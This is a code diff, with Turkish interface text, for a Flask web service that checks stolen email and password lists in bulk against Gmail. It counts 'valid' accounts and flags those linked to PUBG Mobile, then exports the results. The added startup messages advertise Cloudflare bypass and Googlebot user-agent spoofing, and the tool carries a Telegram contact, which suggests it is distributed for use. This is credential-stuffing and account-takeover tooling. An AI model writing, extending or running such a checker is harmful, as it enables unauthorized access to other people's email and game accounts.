+                    alert('✅ ' + accounts.length + ' hesap kontrol edildi!\\n' +
+                          '🎮 PUBG: ' + data.pubg_count + '\\n' +
+                          '✅ Geçerli: ' + data.valid_count + '\\n' +
+                          '❌ Geçersiz: ' + (data.total - data.valid_count));
+                } else {
+                    alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
+                }
                 location.reload();
             } catch (error) {
                 alert('❌ Hata: ' + error);
@@ -915,10 +1020,14 @@ def generate_html_page():
                         body: JSON.stringify({ file_content: content })
                     });
                     const data = await response.json();
-                    alert('✅ Dosya kontrol edildi!\\n' +
-                          '📊 Toplam: ' + data.total + '\\n' +
-                          '🎮 PUBG: ' + data.pubg_count + '\\n' +
-                          '✅ Geçerli: ' + data.valid_count);
+                    if (data.success) {
+                        alert('✅ Dosya kontrol edildi!\\n' +
+                              '📊 Toplam: ' + data.total + '\\n' +
+                              '🎮 PUBG: ' + data.pubg_count + '\\n' +
+                              '✅ Geçerli: ' + data.valid_count);
+                    } else {
+                        alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
+                    }
                     location.reload();
                 } catch (error) {
                     alert('❌ Hata: ' + error);
@@ -978,6 +1087,9 @@ def check_single_api():
         if not email or not password:
             return jsonify({"error": "email and password required"}), 400
         
+        if '@gmail.com' not in email and '@googlemail.com' not in email:
+            return jsonify({"error": "Only Gmail accounts are supported"}), 400
+        
         result = check_single_account(email, password)
         stats["last_check"] = datetime.now().isoformat()
         
@@ -1001,8 +1113,8 @@ def check_bulk_api():
         if not accounts:
             return jsonify({"error": "accounts list required"}), 400
         
-        if len(accounts) > 100:
-            return jsonify({"error": "Maximum 100 accounts per request"}), 400
+        if len(accounts) > 50:
+            return jsonify({"error": "Maximum 50 accounts per request"}), 400
         
         results = []
         valid_count = 0
@@ -1013,7 +1125,7 @@ def check_bulk_api():
             for acc in accounts:
                 email = acc.get('email', '').strip()
                 password = acc.get('password', '').strip()
-                if email and password:
+                if email and password and ('@gmail.com' in email or '@googlemail.com' in email):
                     futures.append(executor.submit(check_single_account, email, password))
             
             for future in futures:
@@ -1072,21 +1184,6 @@ def check_file_api():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-@app.route('/api/stats/reset', methods=['POST'])
-def reset_stats():
-    """İstatistikleri sıfırla"""
-    global stats
-    stats = {
-        "total_checked": 0,
-        "valid_accounts": 0,
-        "pubg_accounts": 0,
-        "bad_accounts": 0,
-        "results": [],
-        "start_time": datetime.now(),
-        "last_check": None
-    }
-    return jsonify({"success": True, "message": "İstatistikler sıfırlandı"})
-
 @app.route('/api/export', methods=['GET'])
 def export_results():
     """Sonuçları txt dosyası olarak dışa aktar"""
@@ -1107,11 +1204,26 @@ def export_results():
             BytesIO(content.encode('utf-8')),
             mimetype='text/plain',
             as_attachment=True,
-            download_name=f'pubg_results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
+            download_name=f'gmail_results_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
         )
         
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+
+@app.route('/api/stats/reset', methods=['POST'])
+def reset_stats():
+    """İstatistikleri sıfırla"""
+    global stats
+    stats = {
+        "total_checked": 0,
+        "valid_accounts": 0,
+        "pubg_accounts": 0,
+        "bad_accounts": 0,
+        "results": [],
+        "start_time": datetime.now(),
+        "last_check": None
+    }
+    return jsonify({"success": True, "message": "İstatistikler sıfırlandı"})
 
 # ==================== MAIN ====================
 
@@ -1121,13 +1233,15 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     
     print("=" * 60)
-    print("🎯 PUBG Mobile Checker API Başlatılıyor...")
+    print("📧 Gmail PUBG Checker API Başlatılıyor...")
     print("=" * 60)
     print(f"📡 Port: {port}")
     print(f"⚡ Max Workers: {CONFIG['max_workers']}")
     print(f"⏱️  Timeout: {CONFIG['timeout']}s")
-    print(f"📊 PUBG Senders: {len(PUBG_SENDERS)}")
     print(f"🌐 User Agents: {len(USER_AGENTS)}")
+    print(f"📧 Gmail Senders: {len(PUBG_SENDERS)}")
+    print("🛡️ Cloudflare Bypass: Aktif")
+    print("🤖 Googlebot User-Agent: Aktif")
     print("📞✈️ Telegram: @rinexdestek")
     print("=" * 60)
     
